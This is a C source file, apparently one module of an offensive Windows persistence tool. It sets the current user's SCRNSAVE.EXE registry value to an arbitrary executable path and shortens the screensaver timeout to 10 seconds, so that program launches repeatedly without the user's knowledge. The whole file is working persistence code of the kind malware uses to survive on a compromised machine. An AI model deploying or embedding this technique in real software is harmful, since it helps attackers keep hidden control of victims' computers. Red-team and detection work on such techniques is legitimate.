#include "persys.h"

void	Screensaver(S_args* params)
{
	HKEY hKey;
	wchar_t ScreenSaveTimeOut[] = L"10";

	printf("\n[*] Starting Screensaver module...\n");
	if (RegOpenKeyExW(HKEY_CURRENT_USER,
		L"Control Panel\\Desktop",
		0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		if (RegSetValueExW(hKey, L"SCRNSAVE.EXE", 0, REG_SZ, (LPBYTE)params->filePath,
			((lstrlenW(params->filePath) + 1) * sizeof(wchar_t)))
			== ERROR_SUCCESS)
		{
			printf("	[+] Registry value successfully created\n");
			wprintf(L"		[i] SCRNSAVE.EXE REG_SZ '%ls'\n",
				params->filePath);
		}
		if (RegSetValueExW(hKey, L"ScreenSaveTimeOut", 0, REG_SZ,
			(LPBYTE)ScreenSaveTimeOut, (3 * sizeof(wchar_t))) == ERROR_SUCCESS)
		{
			printf("	[+] Registry value successfully created\n");
			wprintf(L"		[i] ScreenSaveTimeOut REG_SZ '%ls'\n",
				ScreenSaveTimeOut);
		}
	}
	else
		fprintf(stderr, "Error : opening 'HKCU\\Control Panel\\Desktop' key.\n");
}